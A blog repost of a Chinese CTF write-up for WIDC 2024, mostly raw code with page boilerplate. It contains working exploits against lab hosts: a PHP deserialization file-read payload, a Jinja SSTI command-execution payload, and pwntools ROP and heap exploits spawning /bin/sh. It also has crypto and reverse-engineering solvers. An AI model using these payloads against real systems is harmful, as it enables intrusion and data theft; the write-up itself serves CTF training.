@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024 WIDC writeup by Arr3stY0u | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="WIDC 2024 综合靶场 12 大题：RTSP&#x2F;GPS&#x2F;PHP&#x2F;SSTI&#x2F;PJL&#x2F;pwn&#x2F;AES&#x2F;pyc&#x2F;LLL&#x2F;JNI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 WIDC writeup by Arr3stY0u">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Misc/2024_WIDC_writeup_by_Arr3stY0u/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="WIDC 2024 综合靶场 12 大题：RTSP&#x2F;GPS&#x2F;PHP&#x2F;SSTI&#x2F;PJL&#x2F;pwn&#x2F;AES&#x2F;pyc&#x2F;LLL&#x2F;JNI">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="RTSP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Misc/2024_WIDC_writeup_by_Arr3stY0u/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024 WIDC writeup by Arr3stY0u',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024 WIDC writeup by Arr3stY0u</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024 WIDC writeup by Arr3stY0u"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/183712.html">https://www.ctfiot.com/183712.html</a><br>ID: 183712</p>
+</blockquote>
+<p>rtsp:&#x2F;&#x2F;ubnt:<br><a href="mailto:&#119;&#98;&#x6f;&#x78;&#49;&#x32;&#x33;&#x40;&#49;&#55;&#x32;&#46;&#49;&#48;&#46;&#x30;&#x2e;&#49;&#50;">&#119;&#98;&#x6f;&#x78;&#49;&#x32;&#x33;&#x40;&#49;&#55;&#x32;&#46;&#49;&#48;&#46;&#x30;&#x2e;&#49;&#50;</a>:<br>8554&#x2F;live</p>
+<p>import pynmea2import foliumimport os<br>def parse_file(file_path):# 定义一个数据预处理的函数 txt_tables &#x3D; [] f &#x3D; open(file_path, “r”,encoding&#x3D;’utf-8’) line &#x3D; f.readline() # 读取第一行 locations &#x3D; [] while line: text &#x3D; line[0:]# 从$GPGGA开始读 msg &#x3D; pynmea2.parse(text) # print(msg.latitude) #24.551053333333332 # print(msg.longitude) #118.1067375 tmp &#x3D; [] if(msg.latitude &#x3D;&#x3D; 0.0 or msg.longitude &#x3D;&#x3D; 0.0): line &#x3D; f.readline() # 读取下一行 continue tmp.append(msg.latitude) tmp.append(msg.longitude) locations.append(tmp) line &#x3D; f.readline() # 读取下一行 return locationslocations&#x3D;parse_file(“.&#x2F;a.dat”)def draw_gps(locations, output_path, file_name): m &#x3D; folium.Map(locations[0], zoom_start&#x3D;15, attr&#x3D;’default’) #中心区域的确定 folium.PolyLine( # polyline方法为将坐标用线段形式连接起来 locations, # 将坐标点连接起来 weight&#x3D;3, # 线的大小为3 color&#x3D;’orange’, # 线的颜色为橙色 opacity&#x3D;0.8 # 线的透明度 ).add_to(m) # 将这条线添加到刚才的区域m内 # 起始点，结束点 folium.Marker(locations[0], popup&#x3D;’Starting Point’).add_to(m) folium.Marker(locations[-1], popup&#x3D;’End Point’).add_to(m) m.save(os.path.join(output_path, file_name)) # 将结果以HTML形式保存到指定路径draw_gps(locations,”.&#x2F;“,”index.html”)#调用</p>
+<p>file:&#x2F;&#x2F;$PROJECT_DIR$&#x2F;src&#x2F;PPlab.phpfile:&#x2F;&#x2F;$PROJECT_DIR$&#x2F;src&#x2F;index.phpfile:&#x2F;&#x2F;$PROJECT_DIR$&#x2F;src&#x2F;trueflag.php</p>
+<?php
+class show { public $filename; function printContent() { $content = file_get_contents($this->filename); echo $content; }}
+$a = new show();$a->filename = "php://filter/read=convert.base64-encode/resource=trueflag.php";
+echo serialize($a);
+-----------------
+POST /PPlab.php HTTP/1.1Host: 172.10.0.17:
+1221Upgrade-Insecure-Requests: 1User-Agent:
+ChromeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9X-Forwarded-For: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 104
+show=O:4:"show":1:{s:8:"filename";s:61:"php://filter/read=convert.base64-encode/resource=trueflag.php";}
+
+user={{ config.__class__.__init__.__globals__['os'].popen('cat ./flag/flag').read() }}&pwd=testyjyj
+
+gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl
+
+from pwn import *context.log_level='debug'context.binary=ELF('./server')elf=ELF('./server')libc=ELF('./libc-2.31.so')SOCKFD = 4
+def get(payload): global p p = remote('172.10.0.16', 9080) py=flat({ 0:b'GET /', 255: b'r', 0x138:[ payload ], },filler=b'x00') p.send(py+b'rn')rop=ROP(elf)rop.http_response(4,elf.got['write'])get(rop.chain())p.recvuntil(b'</html>nHTTP/1.1')libcbase=u64(p.recvline().strip().ljust(8,b'x00'))- libc.symbols['write']success(hex(libcbase))libc.address=libcbaserop = ROP(libc)rop.dup2(SOCKFD, 0)rop.dup2(SOCKFD, 1)rop.dup2(SOCKFD, 2)rop.system(next(libc.search(b'/bin/sh')))get(rop.chain())p.recvuntil(b'</html>n')p.interactive()
+
+密文：pbiTIScexzkjzu7byRie4gAyVnzDIlWXdmrm32JX4k9OPzh91SRuzgtgBjN2zbAzYmiP1/Mi0Iplb8vUEC8urUpKk1NOR12fliP/elZ2nXk=key:
+esa7esa7esa7esa7模式：AES/ECB/ZeroBytePadding
+
+charon@root:~/Desktop/tools/pycdc$ ./pycdc 1.pyc
+# Source Generated with Decompyle++# File: 1.pyc (Python 3.8)
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.primitives import paddingfrom cryptography.hazmat.backends import default_backendimport base64
+def encrypt(plaintext, key, iv): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend(), **('backend',)) padder = padding.PKCS7(128).padder() padded_plaintext = padder.update(plaintext) + padder.finalize() encryptor = cipher.encryptor() ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize() return base64.b64encode(ciphertext).decode()
+plaintext = 'flag'ciphertext = 'XalqLcjPTIHqHSnybH24Vy5BfobRchwUlKZpkfOmBoniTrW7dKgdgKg3npyW0ENJgkVlbHjKDTvj0UfSX6agvAGFVlgNV/HE2BS0ELZIM+xE3lU5LNDehjjKeW+ZhZuZjEohAqCJBsHX2zKMrtLlIQ=='key = b'asfdsf141fsad11f'iv = b'MDEyMzQ1Njc4OWFi'ciphertext = encrypt(plaintext.encode(), key, iv)print('密文:', ciphertext)
+
+# sagefrom Crypto.Util.number import *def GaussLatticeReduction(v1, v2): while True: if v2.norm() < v1.norm(): v1, v2 = v2, v1 m = round( v1v2 / v1.norm()^2 ) if m == 0: return (v1, v2)* v2 = v2 - m*v1
+p = 31133702248881127631782881523509514476295949917122267121183371475000133184586174714396793644108294610935657329746903823657946536256899714076625760275173956706353888064555549064829709009640322743264038620966294636309911212621150898337629208482500384052935025619985047550270255090023343971256783414328092914248587672386617566422965425207785676797600936839556684715022346892107346366574407526099471338642307133437759220537846448437788211849588664491112404963383693116467782205041029098512207782583480993966604998421344660336431260561583879139849901548024253578304205860692342713953570388722937954933289936897205980716117h = 7479856923878243888440888672844723062047571272556529760791388804749830947638106557467887553359594527284215983651237303197361839342245930727075103851252694200077479188468017448449313614412769738144700971711549137789290733004590838892989968103378686521773849802601405707815668581933555308957750986742176692804532749076668670300598708809281336336814136161669355533687195881130337149759522328766625901698480300656083599150462729901168306146171589266181628852056728470683680551973098848836293771016415271912573220080593590309888271888517605697277144430578513191280950815089968643259211353244436267567557456053045262878466c = 429633025508597849623581682941413262998122137449005442145138470065847327103036727404626306379284511549714302199598866480970675273975210441015457022843111558443561825331941415126255871526201864795940071437602555024286559341823246182157480790439813986927891748029716157798569943993538191841077926115352987414280071817801043098050542082078666616788674806002113613279589438740909428444797915581688744647694596536620226032782501572321014769949362774191243994608572057792056353664666429685043726397327996076875440373242053749476708726634285972033216701275507339428064215442465140310384610569381749508378023099179079407328
+# Construct lattice.v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);
+# Solve SVP.shortest_vector = m.LLL()[0]# shortest_vector = GaussLatticeReduction(v1, v2)[0]f, g = abs(shortest_vector[0]),abs(shortest_vector[1])print(f, g)
+# Decrypt.a = f*c % p % gm = a * inverse_mod(f, g) % gprint('m=',m)print(long_to_bytes(int(m)))
+
+----
+104487247500523630173466372012725893519340931300717034092093816350849886822853396168341013290959218180002031254321615523603199349964982692123231600651096747843269073795060299161138930217923899257522072771491233070803811809812208840371872635298833148136787331270890661224119684926154327930512610649281320612648 124543096895293893329367669185601759252473199871894159618224942112012325224062867378866918876501559305963983337570110136768019392332660013395569122436762967931653460895335031144428244801453964870767329929024450393254183082388201674464525220841626637783670034040457808515142474641802222980794941462034685363019m= 67557894833899879721535443738683635889742076553897445643184762026832680586233392404925048827896424102785684459189389647962484b'f2jmf5ld0akrqhxmd7ig3ad22b0eda76e391RQ9tZMH5CBjPthat'
+
+jm0g3{djyalj{4og3k1vequwbi:
+f61:6f;36:;2dkkfAWRjSv2UFDukk
+
+bool __fastcall Java_com_ctf_read_MainActivity_getFlag(__int64 a1, __int64 a2, __int64 a3){ const char *v3; // x19 size_t v4; // w20 const char *v5; // x0 __int64 v6; // x8 __int64 v7; // x9 unsigned __int8 *v8; // x11 _BYTE *v9; // x12 __int64 v10; // x17 int v11; // w2 int v12; // w1 int v13; // t1 _BOOL4 v14; // w4 unsigned int v15; // w7 _BOOL4 v16; // w20 _BOOL4 v17; // w10 _BOOL4 v18; // w27 unsigned int v19; // w5 unsigned int v20; // w6 int v21; // w4 char v22; // w10 __int64 v24; // x8 char *v25; // x10 const char *v26; // x9 unsigned int v27; // w15 __int64 v28; // [xsp+8h] [xbp-8h]
+ v3 = (const char *)_JString2CStr(a1, a3); v4 = strlen(v3); v5 = (const char *)malloc(v4 + 1); v5[v4] = 0; if ( (int)v4 < 1 ) return strcmp(v5, buff) == 0; v6 = v4; if ( v4 < 2uLL ) { v7 = 0LL;LABEL_22: v24 = v6 - v7; v25 = (char *)&v5[v7]; v26 = &v3[v7]; do { v27 = *(unsigned __int8 *)v26; if ( v27 - 48 <= 9 ) { v27 = ((unsigned __int8)(v27 - 45) % 0xAu) | 0x30; } else if ( v27 - 97 > 25 ) { if ( v27 - 65 <= 25 ) v27 = (unsigned __int8)(v27 - 62) % 0x1Au + 65; } else { v27 = (unsigned __int8)(v27 - 94) % 0x1Au + 97; } --v24; ++v26; *v25++ = v27 ^ 3; } while ( v24 ); return strcmp(v5, buff) == 0; } v8 = (unsigned __int8 *)(v3 + 1); v9 = v5 + 1; v28 = v4 & 1; v7 = v4 - v28; v10 = v7; do { v11 = *(v8 - 1); v13 = *v8; v8 += 2; v12 = v13; v14 = (unsigned __int8)(v13 - 58) < 246u; // >0x39 or < 0x30 v15 = v11 - 65; v16 = (unsigned __int8)(v13 - 123) < 230u; v17 = (unsigned int)(v13 - 65) > 0x19; v18 = (unsigned int)(v13 - 65) < 26; v19 = ((unsigned __int8)(v13 - 45) % 0xAu) | 0x30; if ( (unsigned int)(v11 - 97) >= 26 ) // <97 v20 = ((unsigned __int8)(v11 - 45) % 0xAu) | 0x30; else v20 = (unsigned __int8)(v11 - 94) % 26u + 97; v21 = v14 && v16; if ( (unsigned int)(v12 - 97) < 26 ) // 97 <= x <= 122 v19 = (unsigned __int8)(v12 - 94) % 26u + 97; if ( (unsigned __int8)(v11 - 58) < 246u && (unsigned __int8)(v11 - 123) < 230u && v15 < 0x1A ) v20 = (unsigned __int8)(v11 - 62) % 26u + 65; if ( (v21 & v18) != 0 ) v19 = (unsigned __int8)(v12 - 62) % 26u + 65; if ( (unsigned __int8)(v11 - 58) >= 246u || (unsigned __int8)(v11 - 123) >= 230u || v15 <= 0x19 ) LOBYTE(v11) = v20; if ( (v21 & v17) != 0 ) v22 = v12; else v22 = v19; v10 -= 2LL; *(v9 - 1) = v11 ^ 3; *v9 = v22 ^ 3; v9 += 2; } while ( v10 ); if ( v28 ) goto LABEL_22; return strcmp(v5, buff) == 0;}
+
+#include <stdio.h>
+int main(void){ // if ( (unsigned __int8)(47 - 123) < 230 )// printf("33333n"); char enc[] = "jm0g3{djyalj{4og3k1vequwbi:
+f61:6f;36:;2dkkfAWRjSv2UFDukk";
+ for(int i = 0; i < 56; i++) { for(int j = 0; j < 0x7f; j++) { unsigned char tmp = j; if(j >= 0x30 && j <= 0x39) tmp = ((unsigned __int8)(j - 45) % 0xA) | 0x30; if(j >= 'A' && j <= 'Z') tmp = (unsigned __int8)(j - 62) % 26 + 65; if(j >= 'a' && j <= 'z') tmp = (unsigned __int8)(j - 94) % 26 + 97; tmp ^= 3; if(tmp == enc[i]) { putchar(j); break; } } }
+ return 0;}
+
+Exp:#coding=utf8
+from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']local = 0binary_name = 'pwn'if local: cn = process('./'+binary_name)else: cn = remote('172.10.0.19',8888)ru = lambda x : cn.recvuntil(x)sn = lambda x : cn.send(x)rl = lambda : cn.recvline()sl = lambda x : cn.sendline(x)rv = lambda x : cn.recv(x)sa = lambda a,b : cn.sendafter(a,b)sla = lambda a,b : cn.sendlineafter(a,b)bin = ELF('./'+binary_name,checksec=False)def z(a=''): if local: gdb.attach(cn,a) if a == '': raw_input() else: passpush = 0x2A3Dpop = 0xFFFF28add = 0x0sub = 0x11111mul = 0xABCEFdiv = 0x514load = -1save = 0x10101010system_addr = 0x8051c60free_hook = 0x80e09f0
+def create(d): return " ".join([str(x) for x in d])heap_offset = (0x110-8) // 4code = create([push,push,push,push,load,push,sub,div,save])data = create(["/bin/sh",system_addr,4,heap_offset,free_hook])cn.sendline(code)cn.sendline(data)cn.interactive()
+
+私钥：-----BEGIN ENCRYPTED PRIVATE KEY-----MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIfp6g2gKBuQICAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBCRTqP45fvUX+BFO9Iq8W/7BIIE0Nfc4n4SbblrA52ukXCOPIZqDSwGgBcAlxjkRJc06Y3kaNMoz4DoOt1hL6GT1d6Th/nfGOEJKJyIz1qfwXiIyKuSGPXmTIukuHZC79jmgUVDd/Tiyg4h4WxJRnAHIeq66M/WLRWbxNqbzMWJ/aU8Vyk/bEgC62I[表情]xE4CUrLjq5mDgF0Mt9J2GBdMBtxONyCtMB4h+m1ik6/hIiBX+MsgUp6PMTYFpK2txbjR0BzR0zXIFuoK2BfDQKKkoJK3+L+6D2Pu69pc4/OmvrULNqNa9XJD1y7ptCAHaHwl/459CnCNoxf5d1GA5RvozHw4Tt6xPz8WQ2vMEucSYCqu4HeW7QBGdzH65IcdpWzDLtsssuSjeROljJL5UplEWwmjL+9y98I42MTFQa4Bhx+MqGEBu8ZMDAePfojwhy1cuhjq2/YcffpWncQnKz96RhIDpLA5SjPwZ7sD5pu0W59ZjtjxVZqqiGW7qph4tg9md8s/oDUjAs+84Wt8171X2GUsI2aiCA7PDzygr+9cmOusNfA+FR4kdC5vuzen0LcqiKHd8btFFeuHF7PGY5pODybGieFRMdK9K1KMMOFp+H5lXXOf5AGJVAvjsgvHKYuGAyfEMtq8KB1BjaOvwaaYY2l6s6E8M1wTt0sjcFaWhxm0sno2/ICmxOOMqm1vY6TRswM0kunSwSXRmaiWcvjyzIBsCRORjbL4qi/NaBfgxaAYZxljcfBNsJz4rvhD3HOm6gai5SNxKj8LFmOuZbJn7WsdbqastuH5lnsjAqqLxqf1N3p3M4qa2b1YimtA9lgBcs2GvChGIr9B6QKJGQdscjfwlDDiIEoHcsMdyhrUPGM024ff+5M+yfhkPRYoOialVp36yBpnGTXMv/FcVc16DBoSxYTmc8hpe68soAOwU2SL2U6VKilO81B2LuVU8EpF56xbfx0oV0Yp+aAYQaOE99WUqRD3f+y2fQbFzrxjD8zwK6gQCR/HV1FUNenyFNmAxNv7k1q9PSj+vDEgGk9b1YG+SfhyXzbsRNR6pPxN75eX/Lohf+fAlb+kOardIjAADFd0575VjoXsklxsYnHY0nrwCZl2url6+qAvfRNcQ+gDa9o83X+k/i1Q8M719KrL7XvhOuks226MFVTnACwFC+ACZVdiW73ab442EhYn4EgVNxIkSxmgonfgqQepftoCtK/ezKpR2+W630CqEl8BGi7s36V6cgBB7dcBLbvi2CGh2nCC0rWmPOOcpryrBxJf1VUhcWsemsHvSG0bIylqMV/POYFSzVVtpaO5kZu5JZbfPNt1FzKSBeSSDwUjUcDrhd+x1u26gVDDiCa2UGRzdu4OQCcOOgkkaQ8QQTPX75BiCMdu+BkhFBlMbPnatxCRsSHKTiHibwOydB7pwnC+ojtiNKwYypJnkuchPD0Ef3oUbiFVgFHnMwn6ivUp4WcspoluNAs6kqobxzKlfdTRJBd/8RJIdmm1MJkIjVHX+E+76B0Y1Rf4q1OJ/SSzHGt0YYXQXliPkWNze6JRA6Ko58t3lAV9JHcAlURkXTDxdSg1BR1zFwqUGLT6HUXBFcpsD/FTh1VX7cFMH/RZcnwIZcPen6orGl5IV4U42D0VoVPNYFUtRNyl2fHtqEIlC4NbA6xUFG-----END ENCRYPTED PRIVATE KEY-----flag:
+R0CHlZ3TTo8Uj8oymgTGGsG/okvPHP3n/v0CKOE4g0uDqEd4snXAq/kxxUSfEQh8xrGtN6XZB5gJpj+p/96cbECoBoVuhqRO9BxmH63X7cHtv6R3181b0aXuQvSF5uQ1DLgl+nIgKcrhromVryYZYtNWU5Y3BkejWtUL+2tfBRyvB1fGPNZB7OmCALFXpVtb0e5I7x+PlGuPCn1KCCnSS3WwwOLMz6Ftk8p2rEevlmAeMGE3UzjgZO3QVg92X1bXKW0cN+LCOgwkwAx2LJWiHZXzN6dpSoFJ2DETnsQ5BUkQGzkxNQBH6ycelFO/Lx5iHnSBb7bI4dCooGaX0qXx0w==
+
+cipflag:b'xebxb1J:}xb6xadSx89x86xabxe7x9bsxd5xebyxf2xdexd2nxf9xa3xa8Gkxb2$BEx03x9fxa1xf7xa9x19x85Sxa8Yxe2Vx98x8dx1eux84xbd`-xcaxd4xc3Em\xd1xa1xf7i6xcbx0cx842txccx94xe6x94xeeAxb4Hxd32hxf5x13K'randomiv:b'xddx92xd2x1axb8xe2<Hxb7xfaNx94xc8x1a$xb3'
+
